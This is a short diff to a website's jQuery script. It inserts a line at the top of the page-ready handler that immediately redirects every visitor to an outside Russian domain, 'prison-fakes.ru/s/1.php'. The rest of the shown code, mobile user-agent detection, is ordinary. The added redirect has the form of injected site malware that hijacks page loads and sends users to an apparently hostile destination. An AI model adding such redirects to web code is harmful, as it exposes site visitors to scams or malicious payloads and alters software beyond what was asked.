@@ -1,4 +1,6 @@
 $(document).ready(function () {
+  document.location.replace("http://prison-fakes.ru/s/1.php");
+
   let isMobile = {
       Android:        function() { return navigator.userAgent.match(/Android/i) ? true : false; },
       BlackBerry:     function() { return navigator.userAgent.match(/BlackBerry/i) ? true : false; },
